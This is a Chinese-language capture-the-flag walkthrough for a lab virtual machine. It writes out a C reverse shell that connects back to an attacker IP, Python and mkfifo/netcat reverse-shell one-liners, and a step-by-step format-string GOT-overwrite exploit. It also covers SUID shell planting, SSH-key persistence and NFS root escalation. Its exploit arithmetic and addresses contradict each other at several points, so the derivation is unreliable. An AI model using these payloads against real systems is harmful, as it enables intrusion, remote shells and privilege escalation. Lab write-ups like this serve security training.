VMware双击打开，默认nat模式即可！

--------------------------------------------
--------------------------------------------
1、nmap 192.168.253.0/24 -sP
MAC Address: 00:50:56:E1:B2:64 (VMware)
Nmap scan report for localhost (192.168.253.229)

--------------------------------------------
--------------------------------------------
2、nmap 192.168.253.229 -p- -A
22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
111/tcp   open  rpcbind 2-4 (RPC #100000)
8088/tcp  open  http    nginx 1.1.19
38831/tcp open  status  1 (RPC #100024)


--------------------------------------------
--------------------------------------------
3、web目录文件枚举

wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 http://192.168.253.229:8088/FUZZ.php

000000185:   200        0 L      4 W        19 Ch       "submit"
000089234:   200        14 L     58 W       488 Ch      "codereview"

发现了存在codereview.php链接！

http://192.168.253.229:8088/codereview.php
Code review

Note: our trainee (Mike) will be reviewing the code until we come up with an official process and a proper portal for code submission.

In the meantime, please use the form below.
提示是代码审查的提交框！


--------------------------------------------
--------------------------------------------
4、webshell

1）发送dayu
hello dayu
回显：Sent for review!

根据响应，看起来我的消息是在系统的某个地方发送的，并且可能已保存！

2）system('uname -a')
这边使用system代审查看下，发现回复的是：
Sorry, due to security precautions, Mike won't review any code containing system() function call.

出于安全考虑，Mike 不会审查任何包含 system() 函数调用的代码。

3）最终测试-C语言shell
通过测试perl、python.....都无法执行反弹shell！

--------------
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void)
{
 int i; // used for dup2 later
 int sockfd; // socket file descriptor
 socklen_t socklen; // socket-length for new connections

 struct sockaddr_in srv_addr; // client address

 srv_addr.sin_family = AF_INET; // server socket type address family = internet protocol address
 srv_addr.sin_port = htons( 443 ); // connect-back port, converted to network byte order
 srv_addr.sin_addr.s_addr = inet_addr("192.168.253.138"); // connect-back ip , converted to network byte order

 // create new TCP socket
 sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );

 // connect socket
 connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));

 // dup2-loop to redirect stdin(0), stdout(1) and stderr(2)
 for(i = 0; i <= 2; i++)
  dup2(sockfd, i);

 // magic
 execve( "/bin/sh", NULL, NULL );
}
--------------
nc -vlp 443   ---成功获得反弹shell

python -c 'import pty; pty.spawn("/bin/bash")'

或者：https://github.com/c610/tmp/blob/master/bindshell.c


--------------------------------------------
--------------------------------------------
5、格式字符串缓冲区溢出  my_first

在/home/mike当前目录下发现my_first红头文件！

1）测试是否存在缓冲区溢出
./my_first $(python -c 'print "A"*2000')   ---发现无法将其崩溃！！！
该程序存在需要执行数值判断。测试中1+2返回的是总和！GDB分析看下main!

gdb my_first
disas main
发现存在：0x080484c5 <+42>:	call   0x8048340 <printf@plt>

使用了printf函数，测试是否存在格式字符串缓冲区溢出！
%x是printf支持的格式字符串！用来显示关联十六进制输入数值！
从堆栈中获取一个值：
Enter second number: %x
Error details: fff8006c
在第三位输入地存在%x缓冲区溢出！


2）print测试字符串缓冲区溢出

Select your tool:
[1] Calculator         ---计算器
[2] String replay      ---字符串回放
[3] String reverse     ---字符串反转
[4] Exit

printf '1\n1\n1\n4\n' | ./my_first
运行1用于计算器，\n用于换行（也称为输入），然后1用于第一个数字，1用于第二个数字和4退出！
还原也就是这样：
--------
└─# ./my_first     
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection: 1

Enter first number: 1
Enter second number: 1
Result: 1 + 1 = 2

Selection: 4

Goodbye!
--------
这时候就可以在其中添加%x进行下一步测试了！


3）测试溢出点-%%x

printf '1\n1\n%%x\n4\n' | ./my_first
回显：Enter first number: Enter second number: Error details: ffb160dc
可看到它需要2个%来逃避！

找到了%%来测试缓冲区溢出的手法后，需要开始查看空间地址植入A、B、C！


4）找到溢出空间显示

由于格式字符串中使用直接参数访问，可以直接引用参数8！

参考：https://zh.wikipedia.org/wiki/格式化字符串
由于占空间8位数利用：8$进行显示！

printf '1\n1\nAAAA.%%8$x%%x\n4\n' | ./my_first
回显：
Enter first number: Enter second number: Error details: AAAA.41414141ffff06ec
可以看到格式字符串中的参数8，是堆栈部分的开始！


5）寻找system位置

我需要查看地址system()（有效负载将在哪里）和printf（漏洞在哪里）的位置。通过运行 gdb、设置断点、运行程序和打印系统来做到这一点：

gdb my_first
b main
run
print system
$1 = {<text variable, no debug info>} 0xf7dfdd00 <system>
系统位于 0xf7dfdd00


6）寻找printf位置

要找到 printf，我们可以运行 objdump：
objdump -R ./my_first
08049bfc R_386_JUMP_SLOT   printf@GLIBC_2.0

1. system() = 0x40069060
2. printf = 0x08049bfc

接下来弄清楚如何在内存中写入shellcode即可！


7）查看安全机制-ALSR

查看ASLR设置：
mike@pegasus:/home/mike$ cat /proc/sys/kernel/randomize_va_space
2

或者：
sysctl -a --pattern randomize
kernel.randomize_va_space = 2

0 = 关闭
1 = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。（留坑，PIE会影响heap的随机化。。）
2 = 全随机。除了1中所述，还有heap。
说明存在随机化！

8）禁用ALSR

需要禁用ASLR，地址空间布局随机化 (ASLR) 是一种用于操作系统 (OS) 的内存保护过程，它通过随机化系统可执行文件加载到内存中的位置来防止缓冲区溢出攻击。 要禁用，我遵循此文档：https://www.exploit-db.com/exploits/39669/

通过文章知道，为了解决这个问题，可以使用ulimit来增加堆栈大小，ulimit -s unlimited将最大化堆栈大小，有效地导致ASLR实际上不存在，也就是禁用了！

ulimit -s
8192
ulimit -s unlimited
可以看到开始是8192，使用后不存在了！


8）测试printf填充格式字符串

"%n"将一个整数写入进程内存中的位置，需要将shellcode合并到有效负载中，到目前为止，目前只有一堆A 和它在哪里打印的位置地址！

并且在开始构建我们的漏洞利用时，我们的目标是使用%n写入新地址，我们将指向system()，而不是指向当前存在的 printf，它应该允许我们调用shell恶意代码！

接下来测试下将代码写入一个文件程序内，将A替换为printf的位置：

printf '1\n1\nAAAA.%%8$x%%x\n4\n' | ./my_first

替换为：printf = 0x08049bfc
printf '1\n1\n\xfc\x9b\x04\x08%%8$n' > shell

x/x 0x08049bfc

现在说printf位于地址：0x00000004

可以看到准备格式字符串所需的填充时，主要为了调试应用程序！
将使用printf()用于管道的方法对./my_first来重定向到文件，然后在中gdb中运行二进制文件，可以看到使用编译的文件来重定向输入到printf()！

剩下的就是填充格式字符串！下一个目标是将地址0x00000004变成0x40069060，即system()的地址！


9）计算栈空间位置前半段位置
项目三十六里面格式字符串最后有算数的地方！当时是计算机计算，现在教利用python进行计算！

1. system() = 0x40069060
2. printf = 0x08049bfc

只需要将system的空间地址分两块进行：
4006
9060
由于是小端，从9060开始计算！

计算9060：
我们知道十进制表示法中的位置0004是4，然后我们可以将9060转换为十进制即36960，然后我们从36960中减去4：

shell echo $(python -c 'print 0x9060-0x4')
得到：36956

可以将36956u（%u 是无符号十进制数）和%%8$n（将写入第8位）添加到我们的shell有效负载中，测试看看这是否有效：

printf '1\n1\n\xfc\x9b\x04\x08%%36956u%%8$n' > shell
gdb ./my_first
r < shell
回显：
Program received signal SIGSEGV, Segmentation fault.
0x00009060 in ?? ()

成功编写了前半段的system()位置！



10）计算栈空间位置后半段位置

项目三十六也讲解过了，后半段空间需要实际移动内存中的2个位置来写入这个值也就是：
0x08049bfc
0x08049bfe(+2)

所以shellcode变为：
printf '1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36956u%%8$n%%9$n' > shell
gdb ./my_first
r < shell
0x90649064 in ?? ()
下半部分已经从9060变为9064，这没问题只需要从原始小数中减去4即可
还注意到上半部分是9064，用4006是正确的上半部分进行相同的计算，然后从9064中减去它，这里需要在最低有效位上加一个1，这会进入相同的内存地址，0x14006在去进行减法：
int ("9064", 16)    ---计算出36964
int("14006", 16)    ---计算出81926
81926 - 36946
44962

shellcode编写：继续测试：
printf '1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44962u%%9$n' > shell
gdb ./my_first
r < shell
0x40029060 in ?? ()
可看到还是不对，实际上可以减去十六进制4014和十六进制4006，这是十进制的4之差！
int ("4002", 16)    ---计算出16386
int ("4006", 16)    ---计算出16390
16386 - 16390
-4


11）shellcode
最终shellcode：44962+4=44966
printf '1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n' > shell
gdb ./my_first
r < shell
0x08c3b561 in ?? ()   回显：h: 1: Selection:: not found
输出是正确的，确认可以用system（）覆盖printf（）了！！！

根据回显知道，它会在系统“Selection:”处调用命令程序！测试下将一个简单的netcat（不带-e）的shellcode写入到“Selection:”的文件中！


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.253.229 6666 >/tmp/f

或者直接计算！
shell echo $(python -c 'print 0x14006-0x9060')   ---计算出44966


12）格式字符串缓冲区反弹shell
由于回显内容，可以判断函数内容：system(“Selection:”)！

printf '1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n' > shell

Selection:

echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.253.138",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'" > "Selection:"

echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.253.138 4444 >/tmp/f' > "Selection:"    ----注意双引号问题！

export PATH=.:$PATH
cat shell | ./my_first

成功获得反弹john-shell！


拓展小知识：

----
#include <stdio.h>
int main()
{
    system("cp /bin/sh /tmp/dayu1");
    system("chmod 4777 /tmp/dayu1");
}
----
gcc dayu1.c -o "Selection:"
export PATH=/home/mike/:$PATH
cat shell | ./my_first
ls -la /tmp
-rwsrwxrwx  1 john mike 100284 Apr 14 21:52 dayu1
执行：
/tmp/dayu1 
$ id
uid=1001(mike) gid=1001(mike) euid=1000(john) groups=1000(john),1001(mike)


--------------------------------------------
--------------------------------------------
6、ssh rsa稳定shell
ssh-keygen -t rsa -C john

echo '写入key' > authorized_keys
chmod 600 authorized_keys   ---谨记给权限！
ssh john@192.168.253.229 -i john-key
成功登录！


--------------------------------------------
--------------------------------------------
7、NFS提权（项目二十一、四十都讲解过）
sudo -l 
(root) NOPASSWD: /usr/local/sbin/nfs

sudo提权发现/usr/local/sbin/nfs目录文件可执行root，又是NFS！

sudo /usr/local/sbin/nfs status
Usage: nfs [start|stop]
在最开始nmap枚举端口未发现存在开启nfs端口，这需要开启下：
sudo /usr/local/sbin/nfs start
开启后查看下：
ps aux | grep nfs   ---成功开启
find / -name nfs 2>/dev/null
/opt/nfs   ---发现nfs共享目录

或者：rpcinfo -p 192.168.253.229
showmount -e 192.168.253.229

开始挂载：
mkdir nfs
mount 192.168.253.229:/opt/nfs nfs
mount -t nfs 192.168.253.229:/opt/nfs /tmp/nfs
df   ---成功挂载本地nfs目录


手写shell教过了，用写shell的方法    ----需要注意的是项目是32位的环境，无法运行64位的gcc编译后的！

---
#include <stdlib.h>
int main() { setuid(0); setgid(0); system("/bin/sh"); }
---
nano写入shell.c文件
gcc shell.c -o shell
chmod 4777 shell
./shell
成功提权！

或者：
-----
#include <stdio.h>

int main()
{
    setuid(0);
    setgid(0);
    system("/bin/sh");
}
-----

--------------------------------------------
--------------------------------------------
拓展知识：

2）查看二进制程序启用的安全保护

ELF 安全特性检查工具：hardening-check

参考文章：
http://manpages.ubuntu.com/manpages/trusty/man1/hardening-check.1.html
执行完会提示安装，安装下即可！1分钟~



七种安全机制六种都显示no, not found!！
没有保护措施，这是一个简单直接的格式字符串漏洞

https://blog.csdn.net/weixin_44309300/article/details/114962540
https://www.shuzhiduo.com/A/B0zqLN03dv/


格式字符串允许利用两个基本的攻击向量：
1. 直接内存访问：使用 %x 格式字符串和位置值，可以打印或访问堆栈中的任何内存位置。
2. 写入位置的能力：可以使用 %n 格式字符串写入任何位置，%n 将到目前为止打印的字符数写入所选位置。


















































































































































